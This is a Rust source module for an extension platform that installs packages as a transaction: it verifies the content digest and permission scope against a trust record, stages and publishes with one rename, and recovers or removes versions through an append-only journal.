//! Install as a transaction: stage, verify, publish, and never half-publish.
//!
//! The shape of one install is fixed by the plan (§6 of EXTENSION-PLATFORM.md)
//! and by what a crash can do to it:
//!
//! 1. **Nothing is fetched here.** The host's fetcher hands in the bytes it got
//!    and the trust record they were fetched against; this module has no
//!    client, opens no socket, and cannot be made to reach a directory.
//! 2. **The bytes are checked against the trust before they are written.** A
//!    digest that does not match the record is refused with the content never
//!    leaving memory, and a permission the record does not cover is refused
//!    before the package exists.
//! 3. **Expansion happens in a staging directory, and publication is one
//!    rename.** The active directory is only ever touched by `rename`, so a
//!    failure — including this process dying — leaves the installed version
//!    exactly as it was and an abandoned stage for [`PackageStore::recover`].
//! 4. **No install script is run.** Scripts a package ships are recorded in its
//!    install record so a user can see them; there is no executor on this path,
//!    and [`InstallOutcome::processes_spawned`] is zero by construction.
//!
//! Enabled is not active: an install decides availability. Which instances
//! start, and when, is decided later and per instance.

use crate::platform::extension_packages::artifact::{
    ArtifactLimits, ExpandedPackage, MANIFEST_FILE,
};
use crate::platform::extension_packages::journal::{
    AbandonedStage, InstallJournal, JournalOperation, RecoveryReport, StagedDirectory,
};
use crate::platform::extension_packages::registration::RecordedRegistration;
use crate::platform::extension_packages::state::{InstallActivation, PackageMachine, TrustRecord};
use crate::platform::extension_packages::{
    content_digest, directory_bytes, ensure_private_directory, now_unix_ms, read_bounded_text,
    refusal, remove_managed_tree, replace_file_atomically, unique_suffix,
};
use licoup_application::ApplicationFailure;
use licoup_extension_contracts::deployment::{PackageLifecycle, PackageSource};
use licoup_extension_contracts::manifest::{
    PackageManifest, PermissionRequest, ResourceDeclaration,
};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::path::{Path, PathBuf};

const INSTALL_STAGE: &str = "extension/package-install";
const MAX_RECORD_BYTES: usize = 64 * 1024;
/// The bound on the manifest the host reads back from an installed package
/// before it activates it.
const MAX_MANIFEST_BYTES: usize = 64 * 1024;
const STAGE_MARKER: &str = "stage.json";
const CONTENT_DIRECTORY: &str = "content";

/// The client version a package's compatibility list is checked against.
///
/// The value is the product version this binary was built with, injected by the
/// build script from `tools/client-version.json`; a build with no injected
/// version is a development build and reports its own documented fallback. It is
/// read here and never restated: a literal here would be a second, silently
/// drifting answer to the same question.
pub fn running_client_version() -> Result<String, ApplicationFailure> {
    crate::running_product_version()
        .map(str::to_owned)
        .map_err(|_| {
            refusal("package_client_version_unavailable", INSTALL_STAGE).with_field("clientVersion")
        })
}

/// Proof that one installed package version may be activated on this client.
///
/// It is produced only by [`PackageStore::admit_activation`] and its explicit
/// client-version form, so preparing an instance cannot skip the compatibility
/// check: the admission names the exact package version it was decided for, and
/// [`crate::platform::extension_packages::InstanceMachine::prepare`] refuses an
/// identity that names anything else.
#[derive(Clone, Debug)]
pub struct ActivationAdmission {
    package_id: String,
    version: String,
    client_version: String,
}

impl ActivationAdmission {
    /// The package this admission was issued for.
    pub fn package_id(&self) -> &str {
        &self.package_id
    }

    /// The package version this admission was issued for.
    pub fn version(&self) -> &str {
        &self.version
    }

    /// The client version the compatibility list was checked against.
    pub fn client_version(&self) -> &str {
        &self.client_version
    }
}

/// One step of an install that a test may fail on purpose.
#[derive(Clone, Copy, Debug, Eq, PartialEq)]
pub enum InstallPhase {
    /// Before the bytes are checked.
    Download,
    /// The digest and the permission scope are compared with the trust record.
    Verify,
    /// After the stage is written and before the active directory is touched.
    Stage,
    /// At the publish rename.
    Activate,
}

/// A deliberate failure, so the crash paths are exercised rather than assumed.
#[derive(Clone, Copy, Debug, Default, Eq, PartialEq)]
pub struct FaultPlan {
    fail_at: Option<InstallPhase>,
}

impl FaultPlan {
    pub const fn none() -> Self {
        Self { fail_at: None }
    }

    pub const fn failing_at(phase: InstallPhase) -> Self {
        Self {
            fail_at: Some(phase),
        }
    }

    pub const fn phase(&self) -> Option<InstallPhase> {
        self.fail_at
    }

    fn check(&self, phase: InstallPhase) -> Result<(), ApplicationFailure> {
        if self.fail_at == Some(phase) {
            return Err(refusal("package_install_interrupted", INSTALL_STAGE)
                .with_presentation_arg("phase", phase_name(phase)));
        }
        Ok(())
    }
}

fn phase_name(phase: InstallPhase) -> &'static str {
    match phase {
        InstallPhase::Download => "download",
        InstallPhase::Verify => "verify",
        InstallPhase::Stage => "stage",
        InstallPhase::Activate => "activate",
    }
}

/// A package id that may be used as a path below the managed root.
///
/// The contract's namespaced rule admits lowercase words, digits, `.`, `-` and
/// nested `/` leaves, so no value it admits can be `..`, an absolute path or a
/// platform prefix. Applying it here is what keeps a store operation from
/// joining a caller-supplied string onto the root and walking out of it.
pub(crate) fn checked_package_id(package_id: &str) -> Result<(), ApplicationFailure> {
    if !licoup_extension_contracts::is_namespaced(package_id) {
        return Err(refusal("package_identity_invalid", INSTALL_STAGE).with_field("packageId"));
    }
    Ok(())
}

/// A package identity that is safe to turn into a managed path.
pub(crate) fn checked_identity(package_id: &str, version: &str) -> Result<(), ApplicationFailure> {
    checked_package_id(package_id)?;
    if !licoup_extension_contracts::is_semver(version) {
        return Err(refusal("package_identity_invalid", INSTALL_STAGE).with_field("version"));
    }
    Ok(())
}

/// What is being installed, from where, and under whose decision.
#[derive(Clone, Debug)]
pub struct InstallRequest {
    pub package_id: String,
    pub version: String,
    pub source: PackageSource,
    /// The decision this content is installed under. Content-bound: it carries
    /// the digest the bytes must match and the scope the package may not exceed.
    pub trust: TrustRecord,
    pub activation: InstallActivation,
    pub limits: ArtifactLimits,
    pub faults: FaultPlan,
    /// Registrations this version creates while it is installed. The owner that
    /// writes one records it here, so uninstall releases exactly what exists.
    pub registrations: Vec<RecordedRegistration>,
}

impl InstallRequest {
    pub fn new(
        package_id: impl Into<String>,
        version: impl Into<String>,
        source: PackageSource,
        trust: TrustRecord,
    ) -> Self {
        Self {
            package_id: package_id.into(),
            version: version.into(),
            source,
            trust,
            activation: InstallActivation::EnabledOnDemand,
            limits: ArtifactLimits::default(),
            faults: FaultPlan::none(),
            registrations: Vec::new(),
        }
    }

    /// Declare the registrations this version creates.
    pub fn with_registrations(mut self, registrations: Vec<RecordedRegistration>) -> Self {
        self.registrations = registrations;
        self
    }

    pub fn with_activation(mut self, activation: InstallActivation) -> Self {
        self.activation = activation;
        self
    }

    pub fn with_limits(mut self, limits: ArtifactLimits) -> Self {
        self.limits = limits;
        self
    }

    pub fn with_faults(mut self, faults: FaultPlan) -> Self {
        self.faults = faults;
        self
    }
}

/// What the host wrote down about an installed version.
#[derive(Clone, Debug, Deserialize, Eq, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct InstalledPackage {
    pub package_id: String,
    pub version: String,
    /// The digest of the bytes that were installed. Trust and uninstall previews
    /// compare against this, not against anything the package says.
    pub digest: String,
    pub source: PackageSource,
    /// Which check the trust came from: `verified` or `local-approved`.
    pub trust_channel: PackageLifecycle,
    pub installed_at_unix_ms: i64,
    pub compressed_bytes: u64,
    pub expanded_bytes: u64,
    pub entry_count: usize,
    #[serde(default)]
    pub install_scripts: Vec<String>,
    /// The interpreter or runtime the manifest references, when it references
    /// one. A `user:` reference is the user's own and is never removed.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub runtime_ref: Option<String>,
    #[serde(default)]
    pub permissions: Vec<PermissionRequest>,
    /// Registrations this version created in surfaces other modules own.
    ///
    /// Empty for a package that registered nothing, which is the ordinary case
    /// for a package the host starts itself. Uninstall releases exactly this set
    /// through the owning modules, so a package is never credited with a surface
    /// it did not write and never left holding one it did.
    #[serde(default)]
    pub registrations: Vec<RecordedRegistration>,
}

impl InstalledPackage {
    /// Whether this package's runtime reference is the host's to release.
    pub fn owns_shared_runtime(&self) -> bool {
        self.runtime_ref.as_deref().is_some_and(|reference| {
            !reference.starts_with(licoup_extension_contracts::manifest::USER_RUNTIME_PREFIX)
        })
    }

    pub fn key(&self) -> String {
        format!("{}@{}", self.package_id, self.version)
    }
}

/// The user's own switch for one installed version.
///
/// Installing decides availability; this decides whether the version is switched
/// on. It is a durable preference and not a running instance: flipping it starts
/// nothing, replaces nothing and touches no bytes, so it never needs the
/// maintenance guard. A version with no preference recorded was never explicitly
/// switched off.
#[derive(Clone, Copy, Debug, Deserialize, Eq, PartialEq, Serialize)]
#[serde(rename_all = "camelCase")]
pub struct PackagePreference {
    pub enabled: bool,
    pub updated_at_unix_ms: i64,
}

/// The result of one successful install.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct InstallOutcome {
    pub installed: InstalledPackage,
    pub state: PackageLifecycle,
    /// Always zero: no install script is executed, and no probe is run.
    pub processes_spawned: u32,
    /// Scripts the package carried, reported so a user can see what it would
    /// have run.
    pub install_scripts: Vec<String>,
}

/// A staged directory, as recovery sees it.
#[derive(Clone, Debug)]
pub struct StagedPackage {
    pub directory: PathBuf,
    pub marker: Option<StagedDirectory>,
}

/// The managed root of installed optional packages.
#[derive(Clone, Debug)]
pub struct PackageStore {
    root: PathBuf,
    journal: InstallJournal,
}

impl PackageStore {
    /// Open (creating when absent) the managed root.
    pub fn open(root: &Path) -> Result<Self, ApplicationFailure> {
        for directory in ["packages", "records", "staging", "cache", "preferences"] {
            ensure_private_directory(&root.join(directory))?;
        }
        // The managed root is resolved once so every path derived from it is a
        // real path: the host's no-follow extractor refuses a destination
        // reached through a symlinked ancestor, and a temporary root often is.
        let root = std::fs::canonicalize(root).map_err(|_| {
            refusal("package_directory_unavailable", INSTALL_STAGE).with_field("root")
        })?;
        let journal = InstallJournal::open(&root)?;
        Ok(Self { root, journal })
    }

    /// Every installed version, reconciled first.
    ///
    /// This is the only route to the catalogue, and the recovery runs *before*
    /// the records are read so a crash in the middle of an install can never be
    /// presented as a half-installed version: a stage whose publication was
    /// interrupted is finished or reclaimed while nothing has read the record
    /// set yet. A caller cannot forget the recovery because it cannot reach
    /// [`PackageStore::installed`] through this route without it.
    pub fn catalogue(&self) -> Result<(RecoveryReport, Vec<InstalledPackage>), ApplicationFailure> {
        let report = self.recover()?;
        Ok((report, self.installed()?))
    }

    /// Where the user's switch for one version lives.
    pub fn preference_path(&self, package_id: &str, version: &str) -> PathBuf {
        self.root
            .join("preferences")
            .join(package_id)
            .join(format!("{version}.json"))
    }

    /// The user's switch for one version, or `None` when never set.
    pub fn preference(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<Option<PackagePreference>, ApplicationFailure> {
        checked_identity(package_id, version)?;
        let Some(text) =
            read_bounded_text(&self.preference_path(package_id, version), MAX_RECORD_BYTES)?
        else {
            return Ok(None);
        };
        serde_json::from_str(&text)
            .map(Some)
            .map_err(|_| refusal("package_record_invalid", INSTALL_STAGE).with_field("preference"))
    }

    /// Switch one installed version on or off.
    ///
    /// Refuses a version that is not installed: a preference about bytes this
    /// client does not hold would be a fact with nothing behind it. Enabling is
    /// not activation — no instance starts, no generation moves and no byte
    /// changes — so this is not maintenance and does not pass the idle seam.
    pub fn set_enabled(
        &self,
        package_id: &str,
        version: &str,
        enabled: bool,
    ) -> Result<PackagePreference, ApplicationFailure> {
        if self.installed_version(package_id, version)?.is_none() {
            return Err(refusal("package_not_installed", INSTALL_STAGE)
                .with_field("packageId")
                .with_presentation_arg("package", package_id));
        }
        let preference = PackagePreference {
            enabled,
            updated_at_unix_ms: now_unix_ms(),
        };
        let text = serde_json::to_string_pretty(&preference).map_err(|_| {
            refusal("package_record_invalid", INSTALL_STAGE).with_field("preference")
        })?;
        replace_file_atomically(&self.preference_path(package_id, version), &text)?;
        Ok(preference)
    }

    /// Record that an installed version created one registration.
    ///
    /// The owner that writes the registration calls this at the moment it writes
    /// it, so the record is what exists rather than what a manifest promised. A
    /// repeated call for the same owner and key is idempotent: recording the same
    /// fact twice does not make uninstall release it twice.
    pub fn record_registration(
        &self,
        package_id: &str,
        version: &str,
        registration: RecordedRegistration,
    ) -> Result<InstalledPackage, ApplicationFailure> {
        registration.validate()?;
        let mut installed = self
            .installed_version(package_id, version)?
            .ok_or_else(|| {
                refusal("package_not_installed", INSTALL_STAGE)
                    .with_field("packageId")
                    .with_presentation_arg("package", package_id)
            })?;
        if installed.registrations.contains(&registration) {
            return Ok(installed);
        }
        installed.registrations.push(registration);
        self.write_record(&installed)?;
        Ok(installed)
    }

    pub fn root(&self) -> &Path {
        &self.root
    }

    pub fn journal(&self) -> &InstallJournal {
        &self.journal
    }

    /// Where an installed version lives.
    pub fn installed_path(&self, package_id: &str, version: &str) -> PathBuf {
        self.root.join("packages").join(package_id).join(version)
    }

    /// Where the host's record of that version lives.
    pub fn record_path(&self, package_id: &str, version: &str) -> PathBuf {
        self.root
            .join("records")
            .join(package_id)
            .join(format!("{version}.json"))
    }

    pub fn staging_path(&self) -> PathBuf {
        self.root.join("staging")
    }

    /// Install bytes the host already holds.
    ///
    /// A local import and a fetched download take the same path after this
    /// point; the only difference is which trust channel the record carries.
    pub fn install(
        &self,
        request: &InstallRequest,
        bytes: &[u8],
    ) -> Result<InstallOutcome, ApplicationFailure> {
        request.faults.check(InstallPhase::Download)?;

        let is_local = request.source.is_local();
        let mut machine = if is_local {
            PackageMachine::local_import(
                request.package_id.clone(),
                request.version.clone(),
                request.trust.clone(),
            )?
        } else {
            let mut machine =
                PackageMachine::available(request.package_id.clone(), request.version.clone())?;
            machine.observe_downloaded()?;
            machine.record_trust(request.trust.clone())?;
            machine
        };

        // The digest of what arrived must be the digest the decision was made
        // about. This is the whole reason trust is bound to content.
        let digest = content_digest(bytes);
        request
            .trust
            .check_content(&digest)
            .map_err(|mut failure| {
                failure = failure
                    .with_presentation_arg("package", request.package_id.as_str())
                    .with_presentation_arg("phase", phase_name(InstallPhase::Verify));
                failure
            })?;
        request.faults.check(InstallPhase::Verify)?;

        let target = self.installed_path(&request.package_id, &request.version);
        if target.exists() {
            return Err(refusal("package_version_already_installed", INSTALL_STAGE)
                .with_field("version")
                .with_presentation_arg("package", request.package_id.as_str())
                .with_presentation_arg("version", request.version.as_str()));
        }

        let staging = self
            .staging_path()
            .join(format!("{}-{}", request.version, unique_suffix()));
        let content = staging.join(CONTENT_DIRECTORY);
        ensure_private_directory(&staging)?;
        replace_file_atomically(
            &staging.join(STAGE_MARKER),
            &serde_json::json!({
                "packageId": request.package_id,
                "version": request.version,
                "digest": digest,
                "stagedAtUnixMs": now_unix_ms(),
            })
            .to_string(),
        )?;
        self.journal.append(
            JournalOperation::Stage,
            &request.package_id,
            &request.version,
            PackageLifecycle::Staged,
            None,
        )?;

        let expanded = match ExpandedPackage::expand(bytes, &content, &request.limits) {
            Ok(expanded) => expanded,
            Err(failure) => {
                self.rollback(request, &staging, "artifact refused")?;
                return Err(failure);
            }
        };
        if let Err(failure) = expanded.check_identity(&request.package_id, &request.version) {
            self.rollback(request, &staging, "manifest mismatch")?;
            return Err(failure);
        }
        // The package's own compatibility list decides whether this client may
        // load it at all. It is checked before anything is published, and the
        // package's version is not part of the rule: a package released
        // independently of the client is refused only when its list does not
        // cover the running client.
        if let Err(failure) = expanded.manifest().admit_client(&running_client_version()?) {
            self.rollback(request, &staging, "client incompatibility")?;
            return Err(failure);
        }
        // The manifest may ask for more than the user approved; that needs a new
        // decision, not a bigger install.
        let requested = expanded.manifest().permissions.clone();
        if let Err(failure) = request.trust.check_permissions(&requested) {
            self.rollback(request, &staging, "permission scope expanded")?;
            return Err(failure);
        }
        machine.mark_staged()?;

        // A crash from here on leaves the stage on disk for recovery, which is
        // exactly what the journal is for: this return deliberately does not
        // clean up.
        if let Err(failure) = request.faults.check(InstallPhase::Stage) {
            self.journal.append(
                JournalOperation::Rollback,
                &request.package_id,
                &request.version,
                PackageLifecycle::Staged,
                Some("interrupted after staging"),
            )?;
            return Err(failure);
        }

        let parent = target
            .parent()
            .ok_or_else(|| refusal("package_install_path_invalid", INSTALL_STAGE))?;
        ensure_private_directory(parent)?;
        // One rename: the active directory changes in a single step, or not at
        // all.
        std::fs::rename(expanded.content_dir(), &target).map_err(|_| {
            refusal("package_install_publish_failed", INSTALL_STAGE).with_field("packageId")
        })?;
        request.faults.check(InstallPhase::Activate)?;
        let installed = InstalledPackage {
            package_id: request.package_id.clone(),
            version: request.version.clone(),
            digest: expanded.digest().to_owned(),
            source: request.source,
            trust_channel: request.trust.channel(),
            installed_at_unix_ms: now_unix_ms(),
            compressed_bytes: expanded.compressed_bytes(),
            expanded_bytes: expanded.expanded_bytes(),
            entry_count: expanded.entry_count(),
            install_scripts: expanded.install_scripts().to_vec(),
            runtime_ref: runtime_reference(expanded.manifest()),
            permissions: requested,
            registrations: request.registrations.clone(),
        };
        // The host record lands before the journal's commit line: it is the fact
        // that makes the version installable at all. A crash between the two is
        // reconciled as committed; a crash before the record leaves an
        // unrecorded publication, which recovery reclaims rather than exposing
        // as a version that is on disk and invisible everywhere else.
        self.write_record(&installed)?;
        self.journal.append(
            JournalOperation::Commit,
            &request.package_id,
            &request.version,
            PackageLifecycle::Installed,
            None,
        )?;
        machine.commit(request.activation)?;
        remove_managed_tree(&staging)?;

        Ok(InstallOutcome {
            state: machine.state(),
            install_scripts: installed.install_scripts.clone(),
            installed,
            processes_spawned: 0,
        })
    }

    /// Install a package the user built on this machine, from the bytes they
    /// handed in. There is no directory involved and no account.
    pub fn install_local_import(
        &self,
        package_id: &str,
        version: &str,
        trust: TrustRecord,
        bytes: &[u8],
    ) -> Result<InstallOutcome, ApplicationFailure> {
        let request = InstallRequest::new(package_id, version, PackageSource::LocalImport, trust);
        self.install(&request, bytes)
    }

    /// Undo a staged install that was never published.
    fn rollback(
        &self,
        request: &InstallRequest,
        staging: &Path,
        reason: &str,
    ) -> Result<(), ApplicationFailure> {
        remove_managed_tree(staging)?;
        self.journal.append(
            JournalOperation::Rollback,
            &request.package_id,
            &request.version,
            PackageLifecycle::Staged,
            Some(reason),
        )?;
        Ok(())
    }

    fn write_record(&self, installed: &InstalledPackage) -> Result<(), ApplicationFailure> {
        let text = serde_json::to_string_pretty(installed)
            .map_err(|_| refusal("package_record_invalid", INSTALL_STAGE))?;
        replace_file_atomically(
            &self.record_path(&installed.package_id, &installed.version),
            &text,
        )
    }

    /// Every installed version, with its host record.
    pub fn installed(&self) -> Result<Vec<InstalledPackage>, ApplicationFailure> {
        let records = self.root.join("records");
        let mut installed = Vec::new();
        for package in read_directory(&records)? {
            let Some(name) = package.file_name().and_then(|name| name.to_str()) else {
                continue;
            };
            let package_id = name.to_owned();
            for record in read_directory(&package)? {
                let Some(file) = record.file_name().and_then(|name| name.to_str()) else {
                    continue;
                };
                if !file.ends_with(".json") {
                    continue;
                }
                let Some(text) = read_bounded_text(&record, MAX_RECORD_BYTES)? else {
                    continue;
                };
                let Ok(mut installed_package) = serde_json::from_str::<InstalledPackage>(&text)
                else {
                    continue;
                };
                if installed_package.package_id != package_id {
                    // A record that lost its directory identity is reported as
                    // the record says; the directory is only a lookup path.
                    installed_package.package_id = package_id.clone();
                }
                installed.push(installed_package);
            }
        }
        installed.sort_by_key(|package| package.key());
        Ok(installed)
    }

    pub fn installed_version(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<Option<InstalledPackage>, ApplicationFailure> {
        checked_identity(package_id, version)?;
        let path = self.record_path(package_id, version);
        let Some(text) = read_bounded_text(&path, MAX_RECORD_BYTES)? else {
            return Ok(None);
        };
        serde_json::from_str(&text)
            .map(Some)
            .map_err(|_| refusal("package_record_invalid", INSTALL_STAGE))
    }

    /// The manifest of one installed version, read back from the content the host
    /// published.
    ///
    /// The package's own declaration is the source of truth for its compatibility
    /// list, and this reads the copy that was actually installed rather than a
    /// record the host wrote about it: a record would be the host answering its own
    /// question.
    pub fn installed_manifest(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<PackageManifest, ApplicationFailure> {
        checked_identity(package_id, version)?;
        let path = self.installed_path(package_id, version).join(MANIFEST_FILE);
        let Some(text) = read_bounded_text(&path, MAX_MANIFEST_BYTES)? else {
            return Err(refusal("package_manifest_missing", INSTALL_STAGE).with_field("manifest"));
        };
        let value: serde_json::Value = serde_json::from_str(&text).map_err(|_| {
            refusal("package_manifest_invalid", INSTALL_STAGE).with_field("manifest")
        })?;
        PackageManifest::from_value(value)
    }

    /// Admit one installed version for activation against one client version.
    ///
    /// Activation is where a package installed under an older client is checked
    /// again: the client may have been updated since, and a package that covered
    /// it then may not cover it now. A package whose list does not cover the
    /// client is refused here with the same stable reason the installer uses, and
    /// nothing about the installed files changes.
    pub fn admit_activation_for_client(
        &self,
        package_id: &str,
        version: &str,
        client_version: &str,
    ) -> Result<ActivationAdmission, ApplicationFailure> {
        let manifest = self.installed_manifest(package_id, version)?;
        manifest.admit_client(client_version)?;
        Ok(ActivationAdmission {
            package_id: package_id.to_owned(),
            version: version.to_owned(),
            client_version: client_version.to_owned(),
        })
    }

    /// The typed data resources one installed version carries.
    ///
    /// They are read from the manifest inside the installed content — the same
    /// declaration the installer validated, the definition files of which were
    /// checked present before publication — and they come back as typed
    /// declarations rather than as free-form JSON, so a consumer names a kind and
    /// its coverage instead of parsing an untyped document. An installed package
    /// that declares no resource returns an empty list rather than a refusal.
    ///
    /// This adds no installer and no second admission path: it answers from what
    /// [`PackageStore::install`] already published, and a package this client may
    /// not load cannot have been published by it.
    pub fn installed_resources(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<Vec<ResourceDeclaration>, ApplicationFailure> {
        self.installed_manifest(package_id, version)
            .map(|manifest| manifest.resources)
    }

    /// Which prepared release of one version the installed record is.
    ///
    /// The install journal is append-only and records one `commit` line each
    /// time staged bytes were published as this version, so the count is the
    /// release number the resources of that publication belong to: installing
    /// the same version again from new bytes is the next release of the same
    /// version, and a consumer that binds its state to the release sees the
    /// change instead of two different publications looking identical.
    ///
    /// This counts what this store published. It reads no manifest and starts
    /// nothing, and a version this store never committed answers zero — the same
    /// answer the journal's own [`InstallJournal::committed`] gives for it.
    pub fn committed_releases(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<u64, ApplicationFailure> {
        Ok(self
            .journal
            .entries()?
            .iter()
            .filter(|entry| {
                entry.operation == JournalOperation::Commit
                    && entry.package_id == package_id
                    && entry.version == version
            })
            .count() as u64)
    }

    /// Admit one installed version for activation on this client.
    ///
    /// The client version is the running product version, from the same owner the
    /// installer uses.
    pub fn admit_activation(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<ActivationAdmission, ApplicationFailure> {
        self.admit_activation_for_client(package_id, version, &running_client_version()?)
    }

    /// Staging directories a crashed install may have left behind.
    ///
    /// A directory with content was interrupted before publication; a directory
    /// with only its marker was interrupted *during* publication, after the
    /// rename that moved the content into the active directory.
    pub fn staged_directories(&self) -> Result<Vec<StagedPackage>, ApplicationFailure> {
        let mut staged = Vec::new();
        for entry in read_directory(&self.staging_path())? {
            let marker_path = entry.join(STAGE_MARKER);
            let has_content = entry.join(CONTENT_DIRECTORY).is_dir();
            if !has_content && !marker_path.exists() {
                continue;
            }
            let marker = read_bounded_text(&marker_path, MAX_RECORD_BYTES)?
                .and_then(|text| serde_json::from_str::<serde_json::Value>(&text).ok())
                .map(|value| StagedDirectory {
                    package_id: value
                        .get("packageId")
                        .and_then(|item| item.as_str())
                        .unwrap_or("unknown")
                        .to_owned(),
                    version: value
                        .get("version")
                        .and_then(|item| item.as_str())
                        .unwrap_or("unknown")
                        .to_owned(),
                    path: entry.clone(),
                    bytes: 0,
                });
            staged.push(StagedPackage {
                directory: entry,
                marker,
            });
        }
        Ok(staged)
    }

    /// Reconcile a crash.
    ///
    /// A stage can mean three things, and the disk decides which:
    ///
    /// - **Its version is active and recorded.** The rename and the host record
    ///   both landed; the journal may have lost its commit line, which is
    ///   restored. The installed version keeps serving and is named.
    /// - **Its content was renamed but never recorded.** No surface ever saw the
    ///   version and no activation can read it, so it is an incomplete
    ///   publication: its bytes are reclaimed and reported rather than left as a
    ///   version `installed` cannot see and a retry cannot replace.
    /// - **It never left the staging directory.** The stage is abandoned and
    ///   reclaimed; the previous version is untouched.
    ///
    /// A removal whose intent was journaled but whose bytes still have a record
    /// is finished here too. A version reinstalled after its removal intent is
    /// left alone: the later commit wins. In none of these cases is a recorded,
    /// installed version that nothing removed deleted.
    pub fn recover(&self) -> Result<RecoveryReport, ApplicationFailure> {
        let mut report = RecoveryReport::default();
        self.finish_interrupted_removals(&mut report)?;
        let mut abandoned = Vec::new();
        for staged in self.staged_directories()? {
            let marker = staged.marker.clone().unwrap_or(StagedDirectory {
                package_id: "unknown".to_owned(),
                version: "unknown".to_owned(),
                path: staged.directory.clone(),
                bytes: 0,
            });
            let known = marker.package_id != "unknown" && marker.version != "unknown";
            let installed_path = self.installed_path(&marker.package_id, &marker.version);
            let installed_here = known && installed_path.exists();
            let record_here = known
                && self
                    .record_path(&marker.package_id, &marker.version)
                    .exists();
            if installed_here && record_here {
                if !self
                    .journal
                    .committed(&marker.package_id, &marker.version)?
                {
                    self.journal.append(
                        JournalOperation::Commit,
                        &marker.package_id,
                        &marker.version,
                        PackageLifecycle::Installed,
                        Some("reconciled after interruption"),
                    )?;
                }
                report
                    .installed_untouched
                    .push(format!("{}@{}", marker.package_id, marker.version));
                remove_managed_tree(&staged.directory)?;
                continue;
            }
            if installed_here {
                let bytes = directory_bytes(&installed_path)?;
                remove_managed_tree(&installed_path)?;
                if let Some(parent) = installed_path.parent()
                    && read_directory(parent)
                        .map(|entries| entries.is_empty())
                        .unwrap_or(false)
                {
                    let _ = std::fs::remove_dir(parent);
                }
                remove_managed_tree(&staged.directory)?;
                self.journal.append(
                    JournalOperation::Rollback,
                    &marker.package_id,
                    &marker.version,
                    PackageLifecycle::Staged,
                    Some("unrecorded publication reclaimed"),
                )?;
                report.reclaimed_bytes += bytes;
                report.abandoned.push(AbandonedStage {
                    package_id: marker.package_id.clone(),
                    version: marker.version.clone(),
                    path: installed_path,
                    reclaimed_bytes: bytes,
                });
                continue;
            }
            abandoned.push(StagedDirectory {
                bytes: directory_bytes(&staged.directory)?,
                ..marker
            });
        }
        let reclaimed = self.journal.recover(&abandoned)?;
        report.abandoned.extend(reclaimed.abandoned);
        report.reclaimed_bytes += reclaimed.reclaimed_bytes;
        report.installed_untouched.sort();
        report.installed_untouched.dedup();
        report.finished_removals.sort();
        report.finished_removals.dedup();
        Ok(report)
    }

    /// Complete removals whose intent is the latest fact about a version.
    ///
    /// The journal is append-only, so the newest entry per version decides: a
    /// removal after the last commit is pending and is finished here; a commit
    /// after the removal means the version was reinstalled and is left alone.
    fn finish_interrupted_removals(
        &self,
        report: &mut RecoveryReport,
    ) -> Result<(), ApplicationFailure> {
        let mut last_commit: BTreeMap<(String, String), usize> = BTreeMap::new();
        let mut last_removal: BTreeMap<(String, String), usize> = BTreeMap::new();
        for (index, entry) in self.journal.entries()?.into_iter().enumerate() {
            let key = (entry.package_id, entry.version);
            match entry.operation {
                JournalOperation::Commit => {
                    last_commit.insert(key, index);
                }
                JournalOperation::Uninstall | JournalOperation::Gc => {
                    last_removal.insert(key, index);
                }
                _ => {}
            }
        }
        for ((package_id, version), removal_index) in last_removal {
            if last_commit
                .get(&(package_id.clone(), version.clone()))
                .is_some_and(|commit_index| commit_index > &removal_index)
            {
                continue;
            }
            if !self.record_path(&package_id, &version).exists() {
                continue;
            }
            let removed = self.remove_version(
                &package_id,
                &version,
                JournalOperation::Gc,
                "removal completed after interruption",
            )?;
            report.reclaimed_bytes += removed.reclaimed_bytes();
            report
                .finished_removals
                .push(format!("{package_id}@{version}"));
        }
        Ok(())
    }

    /// Remove an installed version's content and record.
    ///
    /// Only this module's managed bytes are removed. The user's own data — the
    /// histories, credentials and protocol state a package may have produced —
    /// lives outside this root and is not touched here; clearing it is a
    /// separate, explicit operation.
    pub fn remove_installed(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<RemovedVersion, ApplicationFailure> {
        self.remove_version(
            package_id,
            version,
            JournalOperation::Uninstall,
            "managed bytes reclaimed",
        )
    }

    /// Remove one managed version, recording which operation asked for it.
    pub(crate) fn remove_version(
        &self,
        package_id: &str,
        version: &str,
        operation: JournalOperation,
        note: &str,
    ) -> Result<RemovedVersion, ApplicationFailure> {
        checked_identity(package_id, version)?;
        // The intent lands before the bytes move, so an interruption is finished
        // by the next recovery instead of leaving a half-removed version that
        // `installed` still lists.
        self.journal.append(
            operation,
            package_id,
            version,
            PackageLifecycle::Available,
            Some(note),
        )?;
        let path = self.installed_path(package_id, version);
        let content_bytes = directory_bytes(&path)?;
        remove_managed_tree(&path)?;
        let record = self.record_path(package_id, version);
        let record_bytes = std::fs::metadata(&record).map(|m| m.len()).unwrap_or(0);
        if record.exists() {
            std::fs::remove_file(&record).map_err(|_| {
                refusal("package_remove_failed", INSTALL_STAGE).with_field("version")
            })?;
        }
        // An empty package directory is not a fact worth keeping.
        if let Some(parent) = path.parent()
            && read_directory(parent)
                .map(|entries| entries.is_empty())
                .unwrap_or(false)
        {
            let _ = std::fs::remove_dir(parent);
        }
        Ok(RemovedVersion {
            package_id: package_id.to_owned(),
            version: version.to_owned(),
            content_bytes,
            record_bytes,
        })
    }

    /// The bytes one installed version occupies.
    pub fn installed_bytes(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<u64, ApplicationFailure> {
        checked_identity(package_id, version)?;
        directory_bytes(&self.installed_path(package_id, version))
    }
}

/// What removing one installed version freed.
#[derive(Clone, Debug, Eq, PartialEq)]
pub struct RemovedVersion {
    pub package_id: String,
    pub version: String,
    pub content_bytes: u64,
    pub record_bytes: u64,
}

impl RemovedVersion {
    pub fn reclaimed_bytes(&self) -> u64 {
        self.content_bytes + self.record_bytes
    }
}

fn runtime_reference(
    manifest: &licoup_extension_contracts::manifest::PackageManifest,
) -> Option<String> {
    match &manifest.runtime {
        licoup_extension_contracts::manifest::Runtime::Process { runtime_ref, .. } => {
            runtime_ref.clone()
        }
        _ => None,
    }
}

